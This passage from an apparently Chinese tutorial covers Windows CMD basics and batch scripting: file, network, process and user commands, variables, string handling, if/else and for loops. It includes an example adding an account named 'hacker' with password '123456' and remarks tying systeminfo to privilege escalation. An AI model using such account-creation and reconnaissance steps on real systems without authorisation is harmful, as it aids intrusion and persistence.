id="目录-x2F-文件操作命令"><a href="#目录-x2F-文件操作命令" class="headerlink" title="目录&#x2F;文件操作命令"></a>目录&#x2F;文件操作命令</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span><span class="comment">#切换目录</span></span><br><span class="line"><span class="built_in">cd</span> c:\test<span class="comment">#进入到 c 盘下的 test 目录</span></span><br><span class="line"><span class="built_in">dir</span><span class="comment">#显示目录中的文件和子目录列表</span></span><br><span class="line">/b<span class="comment">#表示去除摘要信息，仅显示完整路径</span></span><br><span class="line">/s<span class="comment">#表示循环列举文件夹中的内容</span></span><br><span class="line"><span class="comment">#单独dir /b与dir /s 都不会显示完整路径，只有这两个组合才会显示完整路径。 </span></span><br><span class="line">/o:n<span class="comment">#表示根据文件名排序</span></span><br><span class="line">/a:a <span class="comment">#表示只枚举文件而不枚举其他</span></span><br><span class="line"><span class="built_in">type</span><span class="comment">#显示文本文件的内容</span></span><br><span class="line"><span class="built_in">type</span> <span class="number">1</span>.txt<span class="comment">#显示 1.txt 文件内容</span></span><br><span class="line"><span class="built_in">echo</span><span class="comment">#打印内容</span></span><br><span class="line"><span class="built_in">echo</span> <span class="number">123</span>&gt;<span class="number">1</span>.txt<span class="comment">#把 123 写入到 1.txt</span></span><br><span class="line"><span class="built_in">md</span><span class="comment">#创建目录</span></span><br><span class="line"><span class="built_in">md</span> <span class="number">123</span><span class="comment">#创建目录名为 123 的文件夹</span></span><br><span class="line">mkdir<span class="comment">#创建目录</span></span><br><span class="line"><span class="built_in">rmdir</span> <span class="comment">#删除目录</span></span><br><span class="line"><span class="built_in">rmdir</span> d:\temp1 /s /q <span class="comment">#删除temp1目录，，</span></span><br><span class="line">/s<span class="comment">#包括子目录</span></span><br><span class="line">/q<span class="comment">#并且删除时不提示</span></span><br><span class="line"><span class="built_in">copy</span><span class="comment">#复制文件</span></span><br><span class="line">/y<span class="comment">#强制复制 不提示</span></span><br><span class="line">xcopy<span class="comment">#复制文件夹</span></span><br><span class="line"><span class="built_in">ren</span><span class="comment">#重命名文件</span></span><br><span class="line"><span class="built_in">rd</span><span class="comment">#删除一个目录</span></span><br><span class="line">/S <span class="comment">#不仅删除目录本身，还删除目录下的内容</span></span><br><span class="line">/Q <span class="comment">#安静模式，不询问是否删除</span></span><br><span class="line"><span class="built_in">del</span><span class="comment">#删除一个或多个文件</span></span><br></pre></td></tr></table></figure><h4 id="举例：dir-显示目录下的子目录和文件"><a href="#举例：dir-显示目录下的子目录和文件" class="headerlink" title="举例：dir 显示目录下的子目录和文件"></a>举例：<code>dir</code> 显示目录下的子目录和文件</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">dir</span> F:\Haoran\桌面 <span class="comment">#显示temp1目录下的文件和目录信息，显示信息包含日期、时间、文件类型和文件名</span></span><br><span class="line"><span class="built_in">dir</span> F:\Haoran\桌面 /a:a /b <span class="comment">#只显示temp1目录下（不包括子目录）的文件的绝对路径，不显示日期、时间、文件类型和文件名</span></span><br><span class="line"><span class="built_in">dir</span> F:\Haoran\桌面 /a:a /b /s /o:n  <span class="comment">#显示temp1路径下（包括子目录）的所有文件的绝对路径。输出文件按照文件名数字顺序排序</span></span><br><span class="line"><span class="built_in">dir</span> F:\Haoran\桌面\*.txt /a:a /b /o:n <span class="comment">#显示.txt后缀文件，并且按照文件名顺序排序(/on),其他排序方法查看help dir</span></span><br></pre></td></tr></table></figure><h4 id="举例-xcopy-目录复制命令"><a href="#举例-xcopy-目录复制命令" class="headerlink" title="举例:xcopy 目录复制命令"></a>举例:<code>xcopy</code> 目录复制命令</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">xcopy temp1 d:\temp2 /y <span class="comment">#将temp1目录下的文件复制到temp2目录，不包括temp1子目录下的文件。</span></span><br><span class="line">xcopy temp1 d:\temp2 /s /e /y  <span class="comment">#将temp1目录下的文件复制到temp2目录，包括temp1子目录下的文件</span></span><br></pre></td></tr></table></figure><h4 id="举例：type-显示文件内容命令"><a href="#举例：type-显示文件内容命令" class="headerlink" title="举例：type 显示文件内容命令"></a>举例：<code>type</code> 显示文件内容命令</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">type</span> file1.txt <span class="comment">#查看file1文件内容</span></span><br><span class="line"><span class="built_in">type</span> file1.txt file2.txt  <span class="comment">#查看file1和file2文件内容</span></span><br><span class="line"><span class="built_in">type</span> file1.txt &gt; file2.txt  <span class="comment">#将file1.txt文件内容重定向到file2.txt</span></span><br><span class="line"><span class="built_in">type</span> nul &gt; file1.txt <span class="comment">#创建文件</span></span><br></pre></td></tr></table></figure><h4 id="举例：del-删除文件命令"><a href="#举例：del-删除文件命令" class="headerlink" title="举例：del 删除文件命令"></a>举例：<code>del</code> 删除文件命令</h4><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">del</span> d:\temp1\file1.txt <span class="comment">#删除temp目录下的file1.txt文件</span></span><br><span class="line"><span class="built_in">del</span> d:\temp\*.txt  <span class="comment">#删除temp目录下的后缀为.txt的文件</span></span><br></pre></td></tr></table></figure><h3 id="常用-测试-命令"><a href="#常用-测试-命令" class="headerlink" title="常用 测试 命令"></a>常用 测试 命令</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ping<span class="comment">#测试网络连通性</span></span><br><span class="line">ping gungnir.top</span><br><span class="line">nslookup<span class="comment">#DNS 域名解析工具</span></span><br><span class="line">nslookup gungnir.top <span class="number">8.8</span>.<span class="number">8.8</span></span><br><span class="line">route<span class="comment">#查看路由的命令</span></span><br><span class="line">route print<span class="comment">#查看路由表，这个命令有时间要深入研究一下</span></span><br><span class="line">arp <span class="literal">-a</span><span class="comment">#查看arp缓存</span></span><br></pre></td></tr></table></figure><h3 id="进程-管理-命令"><a href="#进程-管理-命令" class="headerlink" title="进程 管理 命令"></a>进程 管理 命令</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">tasklist<span class="comment">#显示计算机上运行的进程列表</span></span><br><span class="line">tasklist /V<span class="comment">#显示详细任务信息</span></span><br><span class="line">taskkill<span class="comment">#按照进程 ID（PID）或映像名称终止任务</span></span><br><span class="line">taskkill /PID <span class="number">1024</span><span class="comment">#停止 PID=1024 的进程</span></span><br><span class="line">taskkill /IM capiws.exe <span class="comment">#停止名称为 capiws 的进程</span></span><br><span class="line">taskkill /F /PID <span class="number">1024</span><span class="comment">#强制终止进程</span></span><br></pre></td></tr></table></figure><h3 id="用户-管理-命令"><a href="#用户-管理-命令" class="headerlink" title="用户 管理 命令"></a>用户 管理 命令</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">net user<span class="comment">#windows 账户管理工具</span></span><br><span class="line">net user guest<span class="comment">#列出 guest 账户的信息</span></span><br><span class="line">net user hacker <span class="number">123456</span> /add<span class="comment">#添加账户</span></span><br><span class="line">net user hacker <span class="number">888888</span><span class="comment">#修改密码</span></span><br><span class="line">net user hacker /active:yes|no<span class="comment">#启用|禁用账户</span></span><br><span class="line">net user hacker /delete<span class="comment">#删除账户</span></span><br><span class="line">net localgroup<span class="comment">#查看用户组</span></span><br></pre></td></tr></table></figure><h3 id="网络-管理-命令"><a href="#网络-管理-命令" class="headerlink" title="网络 管理 命令"></a>网络 管理 命令</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">ipconfig<span class="comment">#显示网络配置信息</span></span><br><span class="line">ipconfig /all<span class="comment">#显示完整配置信息</span></span><br><span class="line">ipconfig /displaydns<span class="comment">#显示 DNS 缓存</span></span><br><span class="line">ipconfig /flushdns<span class="comment">#清理 DNS 缓存</span></span><br></pre></td></tr></table></figure><h3 id="信息收集命令"><a href="#信息收集命令" class="headerlink" title="信息收集命令"></a>信息收集命令</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">systeminfo <span class="comment">#查看系统信息及补丁信息，在提权的时候用的多</span></span><br><span class="line">hostname<span class="comment">#用户名</span></span><br></pre></td></tr></table></figure><h3 id="其他命令"><a href="#其他命令" class="headerlink" title="其他命令"></a>其他命令</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SET</span><span class="comment">#查看环境变量</span></span><br><span class="line"><span class="built_in">set</span> path<span class="comment">#设置环境变量</span></span><br><span class="line">netshare<span class="comment">#讲到内网的时候会用</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="批处理常用命令"><a href="#批处理常用命令" class="headerlink" title="批处理常用命令"></a>批处理常用命令</h2><ol><li><code>rem</code> 注释符，也可以用两个冒号代替(::)</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">REM [<span class="type">comment</span>]</span><br><span class="line">::</span><br></pre></td></tr></table></figure><ol start="2"><li><code>echo</code> 显示信息，或启用或关闭命令回显。<code>@</code>字符放在命令前将关闭该命令回显，无论此时echo是否为打开状态。</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> on <span class="comment">#批处理命令在执行时显示自身命令行</span></span><br><span class="line"><span class="built_in">echo</span> off <span class="comment">#批处理命令在执行时不显示自身命令行</span></span><br><span class="line">@<span class="built_in">echo</span> off <span class="comment">#关闭echo 关闭命令行自身的显示，一般命令行输入会先把你的命令输入一遍再去输出结果</span></span><br><span class="line"><span class="built_in">echo</span> Hello World <span class="comment">#打印Hello World</span></span><br><span class="line"><span class="built_in">echo</span> . <span class="comment">#输出空行,&quot;.&quot;可以用，：；”／[\]＋等任一符号替代</span></span><br><span class="line"><span class="built_in">echo</span> test &gt; file.txt <span class="comment">#创建包含字符test的file.txt文件</span></span><br><span class="line"><span class="built_in">echo</span> y | <span class="built_in">del</span> d:\temp\*.txt <span class="comment">#输入y确认删除</span></span><br></pre></td></tr></table></figure><ol start="3"><li><code>pause</code> 暂停并输出“<u>请按任意键继续. . .</u>”</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">pause <span class="comment">#等待并提示&quot;请按任意键继续. . .&quot;</span></span><br><span class="line">pause &gt; nul <span class="comment">#等待但不出现提示语</span></span><br><span class="line"><span class="built_in">echo</span> wait a moment.. &amp; pause &gt; nul <span class="comment">#输出指定输出语&quot;wait a moment..&quot;并等待操作</span></span><br></pre></td></tr></table></figure><ol start="4"><li><p><code>errorlevel</code>程序执行结果返回码，执行成功返回0，失败返回为1</p></li><li><p><code>start</code> 启动一个单独的窗口以运行指定的程序或命令，程序继续向下执行。</p></li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">START</span> [<span class="type">command</span>/<span class="type">program</span>] [<span class="type">parameters</span>]</span><br></pre></td></tr></table></figure><ol start="6"><li><code>exit</code> 退出CMD或当前批处理脚本</li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">EXIT</span> [/<span class="type">B</span>] [<span class="type">exitCode</span>]</span><br><span class="line"><span class="comment">#参数说明：</span></span><br><span class="line"><span class="comment">#/B：指定要退出当前批处理脚本而不是 CMD.EXE。如果从一个批处理脚本外执行，则会退出 CMD.EXE</span></span><br><span class="line"><span class="comment">#exitCode：指定一个数字号码。如果指定了 /B，将 ERRORLEVEL设成那个数字。如果退出 CMD.EXE，则用那个数字设置过程退出代码</span></span><br></pre></td></tr></table></figure><ol start="7"><li><p><code>cls</code> 清除屏幕内容</p></li><li><p><code>help</code> 提供 Windows 命令的帮助信息</p></li></ol><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">HELP [<span class="type">command</span>]</span><br></pre></td></tr></table></figure><h1 id="变量设置和读取"><a href="#变量设置和读取" class="headerlink" title="变量设置和读取"></a>变量设置和读取</h1><h3 id="常用系统变量"><a href="#常用系统变量" class="headerlink" title="常用系统变量"></a>常用系统变量</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">%<span class="built_in">CD</span>%  <span class="comment">#获取当前目录</span></span><br><span class="line">%PATH% <span class="comment">#获取命令搜索路径</span></span><br><span class="line">%DATE% <span class="comment">#获取当前日期。</span></span><br><span class="line">%TIME%  <span class="comment">#获取当前时间。</span></span><br><span class="line">%RANDOM% <span class="comment">#获取 0 和 32767 之间的任意十进制数字。</span></span><br><span class="line">%ERRORLEVEL% <span class="comment">#获取上一命令执行结果码</span></span><br></pre></td></tr></table></figure><h3 id="输出变量"><a href="#输出变量" class="headerlink" title="输出变量"></a>输出变量</h3><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> %variable_name%</span><br></pre></td></tr></table></figure><h3 id="设置变量"><a href="#设置变量" class="headerlink" title="设置变量"></a>设置变量</h3><p>使用set命令显示、设置或删除 windows环境变量。set命令用法可以在cmd下执行”<code>set /?</code>“ 或”<code>help set</code>“查看。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">SET</span> [<span class="type">variable</span>=[<span class="built_in">string</span>]] <span class="comment">#variable表示变量名，string表示变量值。</span></span><br></pre></td></tr></table></figure><p> 举例如下：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> VAR1=<span class="string">&quot;I Love BAT Script&quot;</span></span><br><span class="line"><span class="built_in">echo</span> %VAR1%</span><br></pre></td></tr></table></figure><h1 id="字符串基本操作"><a href="#字符串基本操作" class="headerlink" title="字符串基本操作"></a>字符串基本操作</h1><h3 id="字符串截取"><a href="#字符串截取" class="headerlink" title="字符串截取"></a>字符串截取</h3><p>使用命令 <code>echo %var:~n,k%</code>，其中”%var”，表示待截取字符的字符串，”~”取字符标志符，”n”表示字符截取起始位置，”k” 表示截取结束位置（不包含该字符）。举例如下</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off </span><br><span class="line"><span class="built_in">set</span> str=superhero</span><br><span class="line"><span class="built_in">echo</span> str=<span class="variable">%str%</span> </span><br><span class="line"><span class="built_in">echo</span> str:~<span class="number">0</span>,<span class="number">5</span>=<span class="variable">%str:~0,5%</span></span><br><span class="line"><span class="built_in">echo</span> str:~<span class="number">3</span>=<span class="variable">%str:~3%</span></span><br><span class="line"><span class="built_in">echo</span> str:~-<span class="number">3</span>=<span class="variable">%str:~-3%</span> </span><br><span class="line"><span class="built_in">echo</span> str:~<span class="number">0</span>,-<span class="number">3</span>=<span class="variable">%str:~0,-3%</span> </span><br><span class="line"><span class="built_in">pause</span></span><br></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">str=superhero</span><br><span class="line">str:~0,5=super</span><br><span class="line">str:~3=erhero</span><br><span class="line">str:~-3=ero</span><br><span class="line">str:~0,-3=superh</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><h3 id="字符串替换"><a href="#字符串替换" class="headerlink" title="字符串替换"></a>字符串替换</h3><p>使用命令<code>%var:old_str=new_str%</code> ，举例如下</p><figure class="highlight bat"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off </span><br><span class="line"><span class="built_in">set</span> str=hello world!</span><br><span class="line"><span class="built_in">set</span> temp=<span class="variable">%str:hello=good%</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">%temp%</span> </span><br><span class="line"><span class="built_in">pause</span> </span><br></pre></td></tr></table></figure><p>输出结果如下：</p><figure class="highlight txt"><table><tr><td class="code"><pre><span class="line">good world!</span><br><span class="line">请按任意键继续. . .</span><br></pre></td></tr></table></figure><h1 id="输出一个漂亮的日期和时间"><a href="#输出一个漂亮的日期和时间" class="headerlink" title="输出一个漂亮的日期和时间"></a>输出一个漂亮的日期和时间</h1><blockquote><p>参考某位大佬，下面refer有</p><p>该脚本输出的时间有空格，可以配合第二个脚本去除空格</p></blockquote><h2 id="输出时间-bat"><a href="#输出时间-bat" class="headerlink" title="输出时间.bat"></a>输出时间.bat</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">:: 脚本创建时最好选择GB2312编码(方式很简单，新建txt文件，输入几个中文字符保存后将后缀.txt改成.bat)  </span><br><span class="line">:: @<span class="built_in">echo</span> off 表示不回显执行的命令  </span><br><span class="line">@<span class="built_in">echo</span> off   </span><br><span class="line">@<span class="built_in">echo</span> =========Windows的原本日期时间格式=======================  </span><br><span class="line">:: 设置变量，使用变量时需要用一对%包起来  </span><br><span class="line"><span class="built_in">set</span> ORIGINAL_DATE=%<span class="built_in">date</span>%   </span><br><span class="line"><span class="built_in">echo</span> %ORIGINAL_DATE%  </span><br><span class="line">  </span><br><span class="line">@<span class="built_in">echo</span> =========日期按照YYYY-MM-DD格式显示======================  </span><br><span class="line">:: 日期截取遵从格式 %<span class="built_in">date</span>:~x,y%，表示从第x位开始，截取y个长度(x,y的起始值为0)  </span><br><span class="line">:: windows下DOS窗口<span class="built_in">date</span>的结果 2016/09/03 周六  </span><br><span class="line">:: 年份从第0位开始截取4位，月份从第5位开始截取2位，日期从第8位开始截取2位  </span><br><span class="line"><span class="built_in">set</span> CURRENT_DATE=%<span class="built_in">date</span>:~0,4%-%<span class="built_in">date</span>:~5,2%-%<span class="built_in">date</span>:~8,2%   </span><br><span class="line"><span class="built_in">echo</span> %CURRENT_DATE%  </span><br><span class="line">  </span><br><span class="line">@<span class="built_in">echo</span> =========时间按照HH:MM:SS格式显示========================  </span><br><span class="line">:: 时间截取遵从格式 %time:~x,y%，表示从第x位开始，截取y个长度(x,y的起始值为0)  </span><br><span class="line">:: windows下DOS窗口time的结果 12:05:49.02   </span><br><span class="line">:: 时钟从第0位开始截取2位，分钟从第3位开始截取2位，秒钟从第6位开始截取2位  </span><br><span class="line"><span class="built_in">set</span> CURRENT_TIME=%time:~0,2%:%time:~3,2%:%time:~6,2%    </span><br><span class="line"><span class="built_in">echo</span> %CURRENT_TIME%  </span><br><span class="line">  </span><br><span class="line">@<span class="built_in">echo</span> =========日期时间按照YYYY-MM-DD HH:MM:SS格式显示=========  </span><br><span class="line"><span class="built_in">set</span> CURRENT_DATE_TIME=%<span class="built_in">date</span>:~0,4%-%<span class="built_in">date</span>:~5,2%-%<span class="built_in">date</span>:~8,2%-%time:~0,2%:%time:~3,2%:%time:~6,2%    </span><br><span class="line"><span class="built_in">echo</span> %CURRENT_DATE_TIME%  </span><br><span class="line">  </span><br><span class="line">@<span class="built_in">echo</span> =========日期时间按照YYYYMMDD_HHMMSS格式显示=============  </span><br><span class="line"><span class="built_in">set</span> CURRENT_DATE_TIME_STAMP=%<span class="built_in">date</span>:~0,4%%<span class="built_in">date</span>:~5,2%%<span class="built_in">date</span>:~8,2%_%time:~0,2%%time:~3,2%%time:~6,2%  </span><br><span class="line"><span class="built_in">echo</span> %CURRENT_DATE_TIME_STAMP%  </span><br><span class="line">@<span class="built_in">echo</span> ========================================================= </span><br></pre></td></tr></table></figure><h2 id="去除所有空格-bat"><a href="#去除所有空格-bat" class="headerlink" title="去除所有空格.bat"></a>去除所有空格.bat</h2><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line">:: 去掉所有空格空格</span><br><span class="line">:: Code by JM 2006-11-28 CMD@XP</span><br><span class="line">:: 出处：http://www.cn-dos.net/forum/viewthread.php?tid=25172</span><br><span class="line"><span class="built_in">set</span> <span class="string">&quot;str=   ab c&amp;&gt;!   &quot;</span> </span><br><span class="line"><span class="built_in">set</span> <span class="string">&quot;str=%str: =%&quot;</span></span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;☆%str%☆&quot;</span></span><br><span class="line">pause</span><br><span class="line">goto :eof</span><br></pre></td></tr></table></figure><h1 id="if-x2F-else判断句使用"><a href="#if-x2F-else判断句使用" class="headerlink" title="if&#x2F;else判断句使用"></a>if&#x2F;else判断句使用</h1><p>if&#x2F;else条件语句，用来判定是否符合规定的条件，从而决定执行不同的命令。 在CMD下使用“<code>IF /?</code>”打开 IF 的系统帮助,IF有3种基本的用法,如下</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">IF</span> [<span class="type">NOT</span>] ERRORLEVEL number command</span><br><span class="line"><span class="keyword">IF</span> [<span class="type">NOT</span>] string1==string2 command</span><br><span class="line"><span class="keyword">IF</span> [<span class="type">NOT</span>] EXIST filename command</span><br></pre></td></tr></table></figure><p> 参数说明：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">NOT<span class="comment">#指定只有条件为 false 的情况下，Windows 才应该执行该命令。</span></span><br><span class="line">ERRORLEVEL number<span class="comment">#如果最后运行的程序返回一个等于或大于指定数字的退出代码，指定条件为 true。</span></span><br><span class="line">string1==string2<span class="comment">#如果指定的文字字符串匹配，指定条件为 true。</span></span><br><span class="line">EXIST filename<span class="comment">#如果指定的文件名存在，指定条件为 true。</span></span><br><span class="line">command<span class="comment">#如果符合条件，指定要执行的命令。如果指定的条件为 FALSE，命令后可跟 ELSE 命令，该命令将在 ELSE 关键字之后执行该命令。</span></span><br></pre></td></tr></table></figure><p>  ELSE 子句必须出现在同一行上的 IF 之后。例如:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">IF</span> EXIST filename. (</span><br><span class="line"><span class="built_in">del</span> filename.</span><br><span class="line">) <span class="keyword">ELSE</span> (</span><br><span class="line"><span class="built_in">echo</span> filename. missing.</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p> 或者如果都放在同一行上，以下子句有效:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">IF</span> EXIST filename. (<span class="built_in">del</span> filename.) <span class="keyword">ELSE</span> <span class="built_in">echo</span> filename. missing</span><br></pre></td></tr></table></figure><p> 如果命令扩展被启用，IF 会如下改变:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">IF</span> [/<span class="type">I</span>] string1 <span class="built_in">compare-op</span> string2 command</span><br><span class="line"><span class="keyword">IF</span> CMDEXTVERSION number command</span><br><span class="line"><span class="keyword">IF</span> DEFINED variable command</span><br></pre></td></tr></table></figure><p> 其中， compare-op 可以是:</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">EQU  <span class="comment">#等于</span></span><br><span class="line">NEQ  <span class="comment">#不等于</span></span><br><span class="line">LSS  <span class="comment">#小于</span></span><br><span class="line">LEQ  <span class="comment">#小于或等于</span></span><br><span class="line">GTR  <span class="comment">#大于</span></span><br><span class="line">GEQ  <span class="comment">#大于或等于</span></span><br></pre></td></tr></table></figure><p>  而 <code>/I</code> 开关(如果指定)说明要进行的字符串比较不分大小写。<code>/I</code> 开关可以用于 IF 的 string1&#x3D;&#x3D;string2 的形式上。这些比较都是通用的；原因是，如果 string1 和 string2 都是由数字组成的，字符串会被转换成数字，进行数字比较。</p><h1 id="for语句使用"><a href="#for语句使用" class="headerlink" title="for语句使用"></a>for语句使用</h1><p> cmd命令行窗口下，输入help for 或者 for &#x2F;? 查看for语句的使用方法。for语句基本格式如下：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> %variable <span class="keyword">IN</span> (<span class="built_in">set</span>) <span class="keyword">DO</span> command [<span class="type">command</span>-<span class="type">parameters</span>]</span><br></pre></td></tr></table></figure><p> 参数说明：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">%variable  <span class="comment">#指定一个单一字母可替换的参数。注意：批处理脚本中使用%%variable</span></span><br><span class="line">(<span class="built_in">set</span>)  <span class="comment">#指定一个或一组文件。可以使用通配符。</span></span><br><span class="line">command  <span class="comment">#指定对每个文件执行的命令。</span></span><br><span class="line">command<span class="literal">-parameters</span> <span class="comment">#为特定命令指定参数或命令行开关。</span></span><br></pre></td></tr></table></figure><p> for语句还有4个参数，分别是 <code>/d /r /l /f</code> ，下面分别介绍这4个参数对应的for语句命令。</p><p>（1）<code>/D</code>参数的fro语句格式</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /D %variable <span class="keyword">IN</span> (<span class="built_in">set</span>) <span class="keyword">DO</span> command [<span class="type">command</span>-<span class="type">parameters</span>]</span><br></pre></td></tr></table></figure><p> 说明：如果（set）集中包含通配符，则指定与目录名匹配，而不与文件名匹配。</p><p> 实例：打印C盘根目录下的目录名</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /d %%i <span class="keyword">in</span> (c:/*) <span class="keyword">do</span> (</span><br><span class="line">  <span class="built_in">echo</span> %%i</span><br><span class="line">)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>（2）<code>/R</code>参数的for语句格式</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /<span class="built_in">R</span> [[<span class="type">drive</span>:]<span class="type">path</span>] %variable <span class="keyword">IN</span> (<span class="built_in">set</span>) <span class="keyword">DO</span> command [<span class="type">command</span>-<span class="type">parameters</span>] </span><br></pre></td></tr></table></figure><p> 说明：递归查询指定目录下的匹配文件。默认使用当前目录。</p><p> 实例：打印D盘目录及子目录下的后缀为.txt和.py的文件</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /<span class="built_in">r</span> d:/temp %%i <span class="keyword">in</span> ( *.txt *.py ) <span class="keyword">do</span> (</span><br><span class="line">  <span class="built_in">echo</span> %%i</span><br><span class="line">)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>（3）<code>/L</code>参数的for语句格式</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /L %variable <span class="keyword">IN</span> (<span class="built_in">start</span>,step,<span class="keyword">end</span>) <span class="keyword">DO</span> command [<span class="type">command</span>-<span class="type">parameters</span>]</span><br></pre></td></tr></table></figure><p> 该集表示以增量形式从开始到结束的一个数字序列。因此，(1,1,5)将产生序列1 2 3 4 5，(5,-1,1)将产生序列(5 4 3 2 1)</p><p>实例：打印10以内的奇数</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"><span class="keyword">for</span> /l %%i <span class="keyword">in</span> (<span class="number">1</span>,<span class="number">2</span>,<span class="number">10</span>) <span class="keyword">do</span> (</span><br><span class="line">  <span class="built_in">echo</span> %%i</span><br><span class="line">)</span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>（4）FOR语句的<code>/F</code>参数包含如下3种命令格式：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FOR</span> /F [<span class="string">&quot;options&quot;</span>] %variable <span class="keyword">IN</span> (file<span class="literal">-set</span>) <span class="keyword">DO</span> command [<span class="type">command</span>-<span class="type">parameters</span>]</span><br><span class="line"><span class="keyword">FOR</span> /F [<span class="string">&quot;options&quot;</span>] %variable <span class="keyword">IN</span> (<span class="string">&quot;string&quot;</span>) <span class="keyword">DO</span> command [<span class="type">command</span>-<span class="type">parameters</span>]</span><br><span class="line"><span class="keyword">FOR</span> /F [<span class="string">&quot;options&quot;</span>] %variable <span class="keyword">IN</span> (<span class="string">&#x27;command&#x27;</span>) <span class="keyword">DO</span> command [<span class="type">command</span>-<span class="type">parameters</span>]</span><br></pre></td></tr></table></figure><p> 说明：包含<code>/F</code>的参数可以处理文件内容（file-set）、字符串(“string”)以及执行指定命令(‘command’)返回回的值。可以通过设置[“options”]值实现相关需求。[“options”]值包含关键字说明如下：</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">eol=c <span class="comment">#处理时跳过起始为c字符的行，通常用于跳过注释行。</span></span><br><span class="line">skip=n  <span class="comment">#跳过文件开始的n行</span></span><br><span class="line">delims=xxx  <span class="comment">#指定分隔符集。这个替换了空格和制表符的默认分隔符集。</span></span><br><span class="line">tokens=x,y,m<span class="literal">-n</span>  <span class="comment">#被分隔各字段的处理。</span></span><br><span class="line">usebackq   <span class="comment">#需使用双引号包含文件名时考虑，具体使用执行help for查看</span></span><br></pre></td></tr></table></figure><p> 上面的描述有些地方可能不好裂解，学习并执行完如下几个实例观察输出结果，再去理解效果会更快。</p><p> 实例：操作temp.txt文件内容。</p><figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">@<span class="built_in">echo</span> off</span><br><span class="line"></span><br><span class="line"><span class="built_in">type</span> nul &gt; temp.txt</span><br><span class="line"><span class="built_in">echo</span> ;Test <span class="keyword">for</span> /f <span class="keyword">parameter</span> &gt;&gt; temp.txt</span><br><span class="line"><span class="built_in">echo</span> line1 <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> &gt;&gt; temp.txt</span><br><span class="line"><span class="built_in">echo</span> line2 <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> &gt;&gt; temp.txt</span><br><span class="line"><span class="built_in">echo</span> line3 <span class="number">1</span> <span class="number">2</span> <span class="number">3</span> &gt;&gt; temp.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="number">11</span> <span class="number">12</span> <span class="number">13</span> <span class="number">14</span> <span class="number">15</span> <span class="number">16</span> &gt;&gt; temp.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="number">21</span>,<span class="number">22</span>,<span class="number">23</span>,<span class="number">24</span>,<span class="number">25</span>,<span class="number">26</span> &gt;&gt; temp.txt</span><br><span class="line"><span class="built_in">echo</span> <span class="number">31</span><span class="literal">-32-33-34-35-36</span> &gt;&gt; temp.txt</span><br><span class="line"><span class="keyword">for</span> /F <span class="string">&quot;skip=4 eol=;  tokens=1,3* delims=,- &quot;</span> %%i <span class="keyword">in</span> (temp.txt) <span class="keyword">do</span> (</span><br><span class="line">  <span class="built_in">echo</span>  i=%%i, j=%%j, k=%%k</span><br><span class="line">)</span><br><span class="line">pause</span><br><span class="line"><span 